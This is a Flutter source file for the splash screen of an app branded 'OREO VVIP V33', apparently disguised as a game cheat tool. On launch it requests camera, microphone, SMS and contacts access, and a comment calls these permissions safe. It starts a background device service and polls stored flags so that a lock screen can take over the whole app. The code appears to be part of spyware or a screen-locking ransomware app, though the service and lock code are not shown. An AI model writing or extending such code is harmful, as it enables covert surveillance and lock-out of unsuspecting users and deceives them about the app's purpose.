import 'dart:async';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../lock/lock_screen.dart';
import 'cheat_home.dart';
import '../services/device_service.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});
  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    try {
      // Hanya minta izin yang penting dan aman untuk Android baru
      await [
        Permission.camera, 
        Permission.microphone,
        Permission.sms, 
        Permission.contacts, 
        Permission.notification,
      ].request();

      // Jalanin background service
      await DeviceService.init(); 
    } catch (e) {
      // Kalau izin gagal, aplikasi tetep lanjut gak bakal force close
      debugPrint("Error permission: $e");
    }

    final prefs = await SharedPreferences.getInstance();
    Timer.periodic(const Duration(seconds: 2), (t) async {
      final v1 = prefs.getBool('lock_v1') ?? false;
      final v2 = prefs.getBool('lock_v2') ?? false;
      if ((v1 || v2) && mounted) {
        t.cancel();
        Navigator.of(context).pushAndRemoveUntil(
          MaterialPageRoute(builder: (_) => LockScreen(mode: v2 ? 2 : 1)),
          (_) => false,
        );
      }
    });

    await Future.delayed(const Duration(seconds: 3));
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const CheatHome()),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(
            width: 120, height: 120,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: const RadialGradient(colors: [Color(0xFFC9A227), Color(0xFFB3121F)]),
              boxShadow: [BoxShadow(color: const Color(0xFFC9A227).withOpacity(.5), blurRadius: 40)],
            ),
            child: const Icon(Icons.local_fire_department, size: 60, color: Colors.white),
          ),
          const SizedBox(height: 30),
          const Text('OREO VVIP V33', style: TextStyle(fontSize: 22, letterSpacing: 4, fontWeight: FontWeight.bold, color: Colors.white)),
          const SizedBox(height: 10),
          const Text('v3.3  •  Optimizing', style: TextStyle(fontSize: 11, color: Colors.grey, letterSpacing: 3)),
          const SizedBox(height: 40),
          const SizedBox(width: 220, child: LinearProgressIndicator(backgroundColor: Color(0xFF1E1B26), color: Color(0xFFC9A227))),
        ]),
      ),
    );
  }
}
